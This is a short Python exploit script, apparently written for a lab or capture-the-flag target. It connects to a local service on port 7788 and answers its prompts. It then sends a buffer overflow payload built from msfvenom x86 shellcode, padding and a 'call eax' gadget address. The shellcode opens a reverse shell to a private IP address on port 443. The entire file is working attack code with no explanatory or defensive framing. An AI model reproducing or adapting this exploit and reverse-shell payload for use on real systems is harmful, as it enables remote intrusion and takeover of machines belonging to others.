#!/usr/bin/env python3

import socket
#
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 7788))
client.recv(512)
client.send(b"48093572\n")
client.recv(512)
client.send(b"3\n")
client.recv(512)

# shellcode from msfvenom
buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
buf += b"\x68\xc0\xa8\xbe\x87\x68\x02\x00\x01\xbb\x89\xe1"
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

# padding
buf += b"A" * (168 - len(buf))

# call eax gadget
buf += b"\x63\x85\x04\x08\n"

print(buf)

client.send(buf)
## Autor: JUAN DAVID CATAÑO
